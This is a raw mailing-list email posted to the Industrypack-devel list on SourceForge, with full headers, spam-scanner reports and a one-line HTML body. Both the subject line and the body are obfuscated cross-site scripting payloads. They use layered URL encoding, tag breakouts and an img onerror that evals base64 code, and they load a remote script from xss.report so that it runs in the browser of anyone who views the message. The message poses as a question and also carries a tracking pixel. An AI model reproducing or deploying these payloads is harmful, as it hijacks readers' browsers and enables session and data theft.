Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id gHbAFswMg2k+hAMAu9opvQ
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	for <lists+industrypack-devel@lfdr.de>; Wed, 04 Feb 2026 10:09:32 +0100
X-Original-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 8F657E398E
	for <lists+industrypack-devel@lfdr.de>; Wed, 04 Feb 2026 10:09:31 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:To:Message-Id:Date:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=0zENYeNZlZ1E9G/ompcKxHyGyeSwM7wNmyPJQ9E7i4k=; b=ATgpsoKAXV8Uz2PmTJxLviKJuU
	Jv86BNZePenmVA+ygq0ZJEfPv6j4PgUk6xQEKJJJKuSw4FUAo7nnYh4y8IGoMS+kyKDpBu5N0Sls3
	kOvseyorB9kC+DBguLVABYNPa7VPH/5PxB8cdGCXb6jQmAv+yC2/mWJgWEEqu+UD0cRo=;
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1vnYt7-0005OZ-Fk
	for lists+industrypack-devel@lfdr.de;
	Wed, 04 Feb 2026 09:09:30 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <pm_bounces@pm.mtasv.net>) id 1vnYt1-0005OC-Lg
 for industrypack-devel@lists.sourceforge.net;
 Wed, 04 Feb 2026 09:09:24 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :To:Message-Id:Subject:Date:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=gLUZvCw3++vYGlH54dhAjyFgkFpNmNTjxN1CZtJcJ7E=; b=Vnnk52CUdiAnx3yQlbts2fEhwE
 u/iULQc3qpdtzoUHcvKLxAoUDyZIPTwLkfT2WZY1+uhXJnpCU/v2i66438QcWMpfKOOTK25DTNqEb
 HY4tsJTDLw/Jrgd1RyWVD1L2bbXvNal3Gkmr1H7yLjJrRN4wlipm7fs1a1NcDdae+TR4=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:To:Message-Id:Subject
 :Date:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=gLUZvCw3++vYGlH54dhAjyFgkFpNmNTjxN1CZtJcJ7E=; b=H
 i3YqHWWX6TfyCunpcmdBIQK7tcNTccvCzf7KP0jM67jSmxmUwNxv+45agnsKRfhbmVx1/dc9F7e1m
 lxydOMtlQTeKEizAzPBT3hxV5IH3T6Hksav/cExdQxWv4x1k8bcshGbPLgyIDP4Lx/vK1tF2N2rUB
 cynx42DlRmBDWgq8=;
Received: from sc-ord-mta115.mtasv.net ([50.31.156.115])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1vnYt1-0000DA-Nf for industrypack-devel@lists.sourceforge.net;
 Wed, 04 Feb 2026 09:09:24 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=pm20250324;
 d=pm.mtasv.net; 
 h=From:Date:Subject:Message-Id:To:MIME-Version:Content-Type:
 Content-Transfer-Encoding:Date:From:Message-ID:Reply-To:Sender:Subject:To:CC; 
 t=1770196163; x=1770282563;
 bh=gLUZvCw3++vYGlH54dhAjyFgkFpNmNTjxN1CZtJcJ7E=;
 b=Mi6NbtBU6LWAi6eSfRhzyO6vE/JlErR9CNamp16gp1Hu4bQpBhRfwZcNWCflshluj0VjQ7BVdBRz
 MfMpF+tPJyO/W+6mNS0RaiVO/uUXTBw6soX4GRgohC4O4luwIxHSaryRVYXoWLMFMyWIYgnglxRO
 bGxpE6HmRnWqFqoWpXDe2LqGSIiBcHOtXnG04q8kQQdFu2dD0aG1xbjRYnf7crLv6YvxOis1HF65
 MtnqjrjbLol3eJAR+lZk7rS2URfLvxhGhCuiQJMvvvawQnkCm5GaZQ04FhSn4W1bo2PrZ80cHl3L
 sxeJWWeXdEX+KSrRLLGbvv+4KrPakGb8fQrylA==
Received: by sc-ord-mta115.mtasv.net id hgc6bs3b84kc for
 <industrypack-devel@lists.sourceforge.net>;
 Wed, 4 Feb 2026 04:00:07 -0500 (envelope-from <pm_bounces@pm.mtasv.net>)
X-PM-IP: 50.31.156.115
X-IADB-IP: 50.31.156.115
X-IADB-IP-REVERSE: 115.156.31.50
Date: Wed, 04 Feb 2026 09:00:06 +0000
Message-Id: <6a3aeb28-b796-4c35-b42e-8ca2bd82e5e2@mtasv.net>
To: industrypack-devel@lists.sourceforge.net
Feedback-ID: s37025-_:s37025:a47923:postmark
X-Complaints-To: abuse@postmarkapp.com
X-PM-Message-Id: 6a3aeb28-b796-4c35-b42e-8ca2bd82e5e2
X-PM-RCPT: =?utf-8?q?|bTB8NDc5MjN8MzcwMjV8aW5kdXN0cnlwYWNrLWRldmVsQGxpc3RzLnNvdXJj?=
 =?utf-8?q?ZWZvcmdlLm5ldA=3D=3D|?=
X-PM-Message-Options: v1;
 1.9pyJDRBQFl3CUYqBL78QoQ.4quCGXOeAyjXtkVuShKZAt6c7lPn3WAIXL-M9swHwk7p7eImwUVtrp5lgimamhfe-XgQ-XA9_RT-gtZAMdY6t1-B6gAQ7ek9nC5CV-aIwzubgNlTb4RwZbSbXKxGMi9uPWXKE6Y0Gsb_OBQk4k3S-LtFFQtg29xYWHWB6v8LIbjhlNHphG-qtMgBQZDo83VS
X-PM-MTA-Pool: transactional-1
MIME-Version: 1.0
X-Spam-Score: 1.7 (+)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details. Content preview:
 %2522%253E%253Cimg%2520src%3Dx%2520id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RyYWdvbjAwMSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs%26%2361%3B%2520o
 [...] Content analysis details:   (1.7 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.0 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
 domains are different
 1.0 HTML_IMAGE_ONLY_16     BODY: HTML: images with 1200-1600 bytes of words
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 TVD_SPACE_RATIO        No description available.
 0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML tag
 -0.0 DKIMWL_WL_HIGH         DKIMwl.org - High trust sender
 0.0 RCVD_IN_MSPIKE_H4      RBL: Very Good reputation (+4)
 [50.31.156.115 listed in wl.mailspike.net]
 0.0 RCVD_IN_MSPIKE_WL      Mailspike good senders
X-Headers-End: 1vnYt1-0000DA-Nf
Subject: [Industrypack-devel] =?utf-8?q?Can_you_resolve=3F_=2522=253E=253C?=
 =?utf-8?q?NOSCRIPT=253E=253Cp=2520title=253D=2522=253C=252FNOSCRIPT=253E?=
 =?utf-8?b?JTNDc2NyaXB0JTIwc3JjJTNEJTJGJTJGJTJGeHNzLnJlcG9ydCUyRmMlMkZk?=
 =?utf-8?b?cmFnb24wMDElM0UlM0MlMkZzY3JpcHQlM0UlMjAlMjIlM0UlMjUzRSUyNTND?=
 =?utf-8?q?=25252FtiTle=25253E=25253C=25252FstYle=25253E=25253C=25252FtexT?=
 =?utf-8?q?area=25253E=25253C=25252FscrIpt=25253E=252522=25252F=25252F=252?=
 =?utf-8?q?7=25252F=25252F=25253E=25253CscrIpt=252520src=25253Dhttps=25253?=
 =?utf-8?q?A=25252F=25252Fxss=2Ereport=252Fc=252Fdragon001=25253E=25253C?=
 =?utf-8?q?=25252FscrIpt=25253E?=
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: charles--- via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: charles@apple.com
Content-Type: multipart/mixed; boundary="===============2486849848430081536=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-2.58 / 15.00];
	WHITELIST_DMARC(-7.00)[sourceforge.net:D:+];
	LONG_SUBJ(2.93)[391];
	SUBJ_EXCESS_BASE64(1.50)[];
	SUBJ_EXCESS_QP(1.20)[];
	DMARC_POLICY_ALLOW_WITH_FAILURES(-0.50)[];
	R_DKIM_ALLOW(-0.20)[lists.sourceforge.net:s=beta];
	R_SPF_ALLOW(-0.20)[+ip4:216.105.38.7];
	MAILLIST(-0.20)[mailman];
	MIME_GOOD(-0.10)[multipart/mixed,text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_TLS_LAST(0.00)[];
	DMARC_POLICY_ALLOW(0.00)[lists.sourceforge.net,none];
	RECEIVED_HELO_LOCALHOST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	DBL_BLOCKED_OPENRESOLVER(0.00)[mtasv.net:mid,lists.sourceforge.net:dkim,lists.sourceforge.net:helo,lists.sourceforge.net:rdns];
	FORGED_SENDER_MAILLIST(0.00)[];
	TO_EQ_FROM(0.00)[];
	DKIM_MIXED(0.00)[];
	ARC_NA(0.00)[];
	RCPT_COUNT_ONE(0.00)[1];
	MIME_TRACE(0.00)[0:+,1:~,2:+,3:+];
	R_DKIM_REJECT(0.00)[sourceforge.net:s=x,sf.net:s=x,pm.mtasv.net:s=pm20250324];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	REPLYTO_DOM_NEQ_FROM_DOM(0.00)[];
	TO_DN_NONE(0.00)[];
	PREVIOUSLY_DELIVERED(0.00)[industrypack-devel@lists.sourceforge.net];
	FROM_NEQ_ENVFROM(0.00)[industrypack-devel@lists.sourceforge.net,industrypack-devel-bounces@lists.sourceforge.net];
	FROM_HAS_DN(0.00)[];
	DKIM_TRACE(0.00)[lists.sourceforge.net:+,sourceforge.net:-,sf.net:-,pm.mtasv.net:-];
	NEURAL_HAM(-0.00)[-1.000];
	ASN(0.00)[asn:11320, ipnet:216.105.32.0/21, country:US];
	REPLYTO_DOM_NEQ_TO_DOM(0.00)[];
	TAGGED_RCPT(0.00)[industrypack-devel];
	HAS_REPLYTO(0.00)[charles@apple.com];
	MISSING_XM_UA(0.00)[];
	SUBJECT_HAS_QUESTION(0.00)[]
X-Rspamd-Queue-Id: 8F657E398E
X-Rspamd-Action: no action

--===============2486849848430081536==
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

%2522%253E%253Cimg%2520src%3Dx%2520id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWV=
udCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RyYWdvbjAwMSI7ZG9jdW=
1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs%26%2361%3B%2520onerror%3Deval%28atob%28th=
is.id%29%29%253E<img src=3D"https://ea.pstmrk.it/open?m=3Dv3_1.vZOOf2xndKD3=
9f9OfkBLww.uln5iI8bOflGVdBRLZuCVmhzp9m0hlsJg2GKkLC3mmqBQWQ2fpWgrx2dOsvMCxNU=
hO23XEZn9-dC1BxQyJIJNXyBM0lv4Z00G-1xJAeTgPAZEZq_15xOHZUt0uUrP3BLiLby7DlqFru=
SlOdidAju7rdsKMZNe39tR8phqPw9oKnmhEucKKRdeZYjOeplzRXWHiACXoD2X0dEImwMh_Ev1U=
Rj8vmTZOZkbluq07Lk1oobjYyPgjO99BhcEeRDAQDShcO7uOPxJTRCIsKwqPxnCJLE5wUJFjiAy=
NBJ6CdeTWTrcojRC0QslRPE03xEHIOEDmA7kbNsDcZUA_DqZtmPc5D-U1s-CFgvSV6AXpHRhsSU=
-O8g0GbC8ysfbuBFoWI_fa4oz7WXMkP4T6ZCLMtQXvIFN3FIR-ErhWWsjwkV-ZmudpvQV8lOpAe=
ab2aVCAtooFRhDjfhv1CsVZhue6hTWLHBcF4CSIN11GpmSPROauxysBmE6spoQ3aACRPfV5zkoS=
W9_V9T73vF4d9wZCoMaTDTCgC3OJk204lqP58f6bDhtcijuSGq5z7I_CMFSPBt2FumQZwp1SFOd=
3wcEZoQy6I7-7YpTpQuVf-gY93uT6zY9ZA3Qlzx0ommcN0OLtaByoqWXDlbK8pbty0hrNTSrLJX=
EfkkFZ93GYKuW0KYOXFiGr9ZoVHrsR_NOKITcuwQmsriOKf-ODEASWxvoIekd7ZAlXGJim7FDtd=
MFIzI525w6Pe6faOPrdiiRogpVhJiXzLjLr-mU7pqNb4f70csxgF4ApIlWoWQ9Y5pRJnvQo5CE8=
CBWCVJ0A4Mr8JRlR-S2O1cwD_3fD4Rc9F-PT2aaiWoGKx8R8vH_ukS3_DxfqD7-XX9jIbNwCvAy=
3fCiE812ACOeU5l4KpwLczVC4wCGGwpxRv52YnoKoBsiHyypBbpuJSj2nuXQqmsScGIArth" wi=
dth=3D"1" height=3D"1" border=3D"0" alt=3D"" />


--===============2486849848430081536==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2486849848430081536==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2486849848430081536==--
